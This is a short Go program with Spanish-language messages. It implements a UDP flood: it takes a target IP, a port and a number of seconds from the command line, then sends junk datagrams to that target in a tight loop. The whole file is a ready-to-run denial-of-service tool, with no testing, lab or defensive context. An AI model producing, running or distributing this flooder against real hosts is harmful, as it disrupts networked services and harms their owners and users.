package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"time"
)

func udpFlood(targetIP string, targetPort int, duration time.Duration) {
	addr := net.UDPAddr{
		Port: targetPort,
		IP:   net.ParseIP(targetIP),
	}

	conn, err := net.DialUDP("udp", nil, &addr)
	if err != nil {
		fmt.Println("Error al crear conexión UDP:", err)
		return
	}
	defer conn.Close()

	endTime := time.Now().Add(duration)
	for time.Now().Before(endTime) {
		_, err := conn.Write([]byte("Flood Packet"))
		if err != nil {
			fmt.Println("Error al enviar paquete:", err)
		}
	}
	fmt.Printf("Flooding completado en %s\n", targetIP)
}

func main() {
	if len(os.Args) != 4 {
		fmt.Println("Uso: go run script.go <ip> <puerto> <tiempo_segundos>")
		return
	}

	targetIP := os.Args[1]
	targetPort, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Error al convertir el puerto a entero:", err)
		return
	}

	duration, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("Error al convertir el tiempo a entero:", err)
		return
	}

	udpFlood(targetIP, targetPort, time.Duration(duration)*time.Second)
}
